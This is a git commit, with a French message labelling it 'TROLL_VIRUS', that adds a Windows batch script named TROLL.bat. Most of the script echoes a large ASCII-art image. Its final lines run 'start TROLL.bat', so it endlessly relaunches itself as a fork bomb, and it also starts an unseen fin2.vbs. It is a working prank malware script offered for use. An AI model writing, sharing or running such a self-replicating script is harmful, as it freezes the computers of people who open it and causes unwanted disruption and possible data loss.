722a40f54dd88fb8e2284478e8592164015af77c
Enzo2911 <38391212+Enzo2911@users.noreply.github.com>
2018-05-02 17:18:22 +0200

    TROLL_VIRUS
    a mettre dans un dossier nommé TROLL_VIRUS

---
+++ TROLL.bat
@@ -0,0 +1,60 @@
+@echo off
+echo yydddmdddddmdddddy+ohdddddddddddddmNNNNNmssshddddddddmddNNNdso//yddddmNhso/+ossNNmmNNNmddddsyhosddmN
+echo sdddmmddddddddddhsoyhdmddmdddddddmNNNNNdsoosdddddddddhddNNNdso//+ddddmNhso++osohNNmNNNmddddhoyooddmm
+echo hdddmdddddydddddhyyhdmddmdddddddmmNNNNdsoooyddddddddyyddNmmdoo/::sdddmNdyo///++omNmNNNmdddddo++oddmm
+echo dddmmddddhyddddddyhddmdmmdddddddmNmmmhooooohdhhdhhhhoyddmdmy+o:::+dddmmso///////dNNNNNmdddddy++ohdmm
+echo dddmmddddssddddddhddmmdmdhhhhhdmmNmmyooooosdhhhhhhdsosddmhds:+/oyhhdhdmoo/::::::yNNNNNmdddddh+++hdmm
+echo ddmNmdddhssddddhhhhdmmmmdhhhhdmmmmmso+++++hhhhhhhhy+++dmmshssdyo/:+dhddoo:::::::+mmmmNmddddhhs++hdmm
+echo dmmNddddhosdhhhhhhhmmmmmhhhhhmmmmds++++++ohhhhhhhy++:+dmmhmho/:---:hhdyo+::::::::dmmmmymdddhhy++hdmm
+echo dmNmddddyoohhhhhhhhmmmmdhhhhdmmmdo+++++++yhhhhhhy++:-odmdyy:-------yhh+o+::::::::ymmmmsddddhhho+ydmm
+echo dmmhddhdsoohhhhhhhdmmmmhhhhdmmmdo++++++/+hhhhhhy++::ohddo/+:-------shy+o::/++//::ommmhoymdhhhhy+ydmm
+echo mmmshhhdsooshhhhhhdmmmmhhhhmmmdo+++++/::yhhhhhs+/:oy+ydh+++:----:::oh+/sydmNmmddhhmmmyoomdhhhhh+ydmm
+echo mmdoyhhdo++ohhdhhhdmmmmhhhdmmdo++++/:--shhhhho+/+o/--hmy+/:--:::---+ddmNNNNmdhdmNNmmmdhohmhhhhhohmmd
+echo mmy+shhdo+++ohddhhdmmmdhhhmmms/////-..ohhhhy+/+o/-..:dh+//-::--.:odmmNNNmmmmms//+odmmNNddmdhhhhyhmmd
+echo +ohhho+++/yhmhhhmmmdhhdmmh+///-.../hhhhs+/:--....odo/+/-.../ymmmmNNNNmh/smmy:-:hdsNh:+mdhhhhhdmmd
+echo mmo++ohh++++//hdyhhdmmdhhdmdo///-.../yyhyo//-.......yy+o/...:ymms:.-hNNNNNmmmmms..hs+y:-:dmdhhhhmmdh
+echo md++++sho/++/-ohdshdmmdhhmmmo//:...:yyys///-.......:doo+...ommos.:/:hMMMMNNmdddmo.h:/+---hmdhhhdmmdh
+echo md+++/:ys-////-sdyhdmmmhdmmmy+/:../yyo///:.........ss+o-..smh/:odmmmMMMMMMMdsooym:+./----ymdhhhmmmdh
+echo md+++/./h:-+osooydyymmmhdmmmd///./ys:-/:-.........-o/+:../ds::.-mmmdmNMMMMNho/oymy.-:..-.ymmhhdmmmdd
+echo md+//:-:sy/:/+/--yh+ymmhdmmmmy//os/..:-...........:-:-.../s--.``smh++hmNNmho/oyydm/-.....smmdhdmmmdd
+echo md+++/-.-o/..:/:.-ys/odddmmmmmsso-..-..................../...  `-dhssoooo++osyhhdy/......smmdddmmmdm
+echo mdo+/:...-o-..:/-.-o+:+ddmmmmmds+-`......```````````````....``  `:dmhhhhhhhyysss/........ymmddmmmmmm
+echo mm+//:...../-..-/:-://:/dmmmmmmh+:....``````````````````````````-ohhyo+:::-.............-hdddmmmmmmm
+echo mmo///......:---::--:/+odddmmmmmd+:.````````````````````````````.-..........````........:ddmmmhdmmmm
+echo mms///-.....-::/oyhdmmmmmmmmmdddmh+:.`````````````````````````````````````.`````........+ddddhsdmmmm
+echo mmh///:....-/ydmNNds/:/mmmdhhhs+odds/-.```````````````````````````````````````..........yddddosdmmmm
+echo mmd+///...-:hNmodm:` `:mNNmo+dd:.:ydo//-.``````````````````````````````````````````....-dddds/yddmmd
+echo mmmo///:..-hNm+-yd.-+:oNNNNmdhdy.`./s+-..``````````````````````````````````````````....+ddds//hddmmd
+echo dmmh////-.yNmo--/mdmmmNMMMNNd/:h+```.:/.``````...`````````````````````````````````````.hddy//+dddmdd
+echo hdddo////sNNs:-.`hNmddhmMMMNm+/yd/-```.-.````.-/:-.``````````````````````````````````.+ddy///sddmmdd
+echo dhddh+//odmNo-.  :mmy+/odmmds+ydh+-``````````:.///:.`````````````````````````````````-hds////hddmddh
+echo mddddy//sh+sh+`   /myoo//++oyys:.````````````+.////:.```````````````````````````````.sd+:///+ddddddh
+echo dmddddh+s+/:::-`  `:hmhssyho/.``````````````.s::////-```````````````````````````````/h/-////ydddddhy
+echo dmdddmdho///:-.`````-smdy+-``````````````````-o+:///:.`````````````````````````````:y:-////+ddddddyy
+echo ddddddddds////:-../ssso-.`````````````````````.//:///.````````````````````````````.+--//:::ydddddhyy
+echo dddddddddds::///:......````````````````````````.-:---.````````````````````````````-..//:.-+ddddddyyy
+echo dddddddddddy:.-:::-...````````````````````````````````````````````.````````````````.::-../ydddddhyyy
+echo hdddddddddddh/....---.`````````````````````````````````````````.--.```````````````-:-.`.:shddddhyyyh
+echo hhddddddddmddd+.````````````````````````````````````````````..---.``````````````.-:.```-+hsddddyyhdd
+echo ddhhddddddmddddo.````````````````````````````````````````..-:-.````````````````.--.```-/so/sddhyhddd
+echo ddddhyyhhddddddddy-````````````````````````````.....``````````````````````````..```.-//+///ydhddddhy
+echo hdddddhyyyhhhdddddh+-.`````````````````````````````````......`````````````````````.-/++///sddddddhyy
+echo yyyhdddddhhyyhdddddddho:.````````````````````````````````..`````````````````````.:/+////+hddddhhhddh
+echo yyyyyhddddhyyhddddddddho:-.````````````````````````````````````````````````````-:++/////hddddhddddhy
+echo yyyyyyyhddddhhddddddddhyy+:.`````````````````````````````````````````````````.-/+//////yddddddddhyyy
+echo yyyyyyyyyhddddddddddddyyhhdy/-.`````````````````````````````````````````````.:++//////ydddddddhhyyyy
+echo yyhdddhyyyyyyyhddddddhyyyddddddddhs+:-.``````````````````````````````````.:++/////+shdddddhy+/oyyyyy
+echo dddhyyyyyyhddddddhyyyyyhdddddddddddddddddddddddhyo/-..``````````````.:++//+shdho//shyo///.-ossyyyo/o
+echo ddhyyyyyyhddddddhyyyyyhdddddddddddddddddddddddddddddhs+:-..```````.-++/+shhys+::shyo+oo/.:ossyys/:os
+echo dyyyyyyyhdddddhyyyyyyhdddddddddddddddddddddddddddddddddddy:-:-...-++oshhyo///+sysoosss/-/sssys+-/syy
+echo yyyyyyydddhys++syyyhddddddddddddddddddddddddddddddddddddddd/..:shdyo////+oyyssssssso:/sssyo:-/syyyhd
+echo yyyyyhddhys+:/syyyhdddddddddddddddddddmmdddhdddddddddddddddhoodmmmh///+syyyyyyyyss+:+ssss/-:osyyyhdd
+echo yyhddhso+:-+syyydddddmmmmdddmmddddmdmmdddo///////hmmo+shhdddymmhdddyyyyyyyyyyyss//sss/--+syyyhdddmdh
+echo yhdhyooo::osyyhdddddmmmmmmmdmmdddddddmddh/////:/+mms////+ymmmdysyyyyyyyyyyyyyso:/ss+--+ssyyyddmmmdhh
+echo ossys+:osyyhdddmmmmmmmddddddmddddmmmdddh//:.-//ymh///+osyyyyyyyyyyyyyyyyyyso:-++-.:osyyhdddmmmmdhdmm
+echo yyys/+syyhdddddmmmmmmmdddmdddddddmddddds:-`.:/ymdssyyyyyyyyyyyyyyyyyyyyyss+--:..:osyyhdddmmmmmddmmmd
+echo s+oyyhdmmmmmmmmmmmmmmmmddddddddddddddh+..:+yyyyyyyyyyyyyyyyyyyyyyyyyysso-```-+syyhdddmmmmmmmmmmmdhyy
+echo oyyhdmmmmmmmmmmmmmmmmmmmmdddddddddddo:+syyyyyyyyyyyyyyyyyyyyyyyyyyyyys+-`.:+syyhdddmmmmmmmmmmmddhyhd
+echo mmmmmmmmmmmmmmmmmdmdddddddddddddhhyyyyyyyyyyyyyyyyyyyyyyyyyyyyyysso/:/+syyhddmmmmmmmmmmmmmmdhyyhdmmm
+start TROLL.bat
+start fin2.vbs
